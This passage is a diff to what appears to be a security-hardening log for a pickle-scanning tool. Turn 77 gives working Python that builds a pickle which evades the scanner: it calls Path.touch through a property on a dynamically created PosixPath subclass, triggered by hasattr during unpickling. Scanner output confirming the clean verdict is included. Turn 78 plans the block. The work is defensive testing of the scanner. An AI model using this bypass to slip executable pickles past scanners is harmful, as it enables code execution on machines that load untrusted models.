@@ -3622,3 +3622,117 @@ Blocking plan:
 
 Performance note: one tuple in the sorted static table, no descriptor graph or
 introspection-flow modeling.
+
+## Turn 77 - `builtins.hasattr` descriptor invocation gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using a clean builtin
+introspection helper to invoke an attacker-controlled descriptor getter during
+deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_hasattr_property_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        s("x"),
+        sg("builtins", "property"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R",
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R\x940",
+        sg("builtins", "hasattr"),
+        b"h\x01",
+        s("x"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=185`, `bytes_total=185`, `opcode_count=39`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `builtins.property`, `pathlib.Path.touch`, and `builtins.hasattr`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `hasattr` call returns a
+  `DerivedPath` instance at `/tmp/ma_builtins_hasattr_property_marker` and does
+  not create the marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_builtins_hasattr_property_marker` and returns `True`
+- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
+  subclass with descriptor `x = property(pathlib.Path.touch)`. Calling
+  `hasattr(instance, "x")` performs dynamic attribute lookup and only suppresses
+  `AttributeError`. Resolving `x` invokes the property getter as
+  `Path.touch(instance)`, creating the marker before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `builtins.hasattr` is absent from `BUILTIN_DANGEROUS_NAMES`.
+- `builtins.type` and `builtins.property` are clean. The policy blocks direct
+  `builtins.property.__get__` and `builtins.getattr` references, but this
+  payload never imports either method explicitly.
+- The payload uses only currently clean globals: `builtins.type`,
+  `pathlib.PosixPath`, `builtins.property`, `pathlib.Path.touch`, and
+  `builtins.hasattr`.
+- The dangerous callable is hidden as a descriptor getter and is invoked by the
+  builtin attribute-existence check, so the final visible call target is a
+  common builtin helper rather than the attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, or magic-method names.
+
+Performance note: this is a precise builtin attribute-lookup sink. The focused
+next block should add `hasattr` to `BUILTIN_DANGEROUS_NAMES`, with an oracle
+regression proving that class and descriptor construction alone does not create
+the marker but the `hasattr(instance, "x")` lookup does. This keeps the hot
+path to the existing builtin-name policy check and avoids descriptor-flow
+modeling.
+
+## Turn 78 - Block `builtins.hasattr` descriptor lookups
+
+Blocking plan:
+
+- Add `hasattr` to `BUILTIN_DANGEROUS_NAMES`. The builtin performs dynamic
+  attribute lookup and can invoke attacker-controlled descriptors while checking
+  existence.
+- Leave `builtins.type`, `builtins.property`, and `pathlib.PosixPath` allowed
+  for this focused block. They synthesize the descriptor-bearing object graph,
+  but the side effect in the proof occurs when `hasattr()` resolves the
+  attribute.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"x": property(Path.touch)})` payload, verifies class/instance
+  construction remains clean and does not create the marker, then verifies
+  scan-time detection on the RCE variant before proving `hasattr(instance, "x")`
+  creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one entry in the existing builtin-name slice, no descriptor
+graph or attribute-flow modeling.
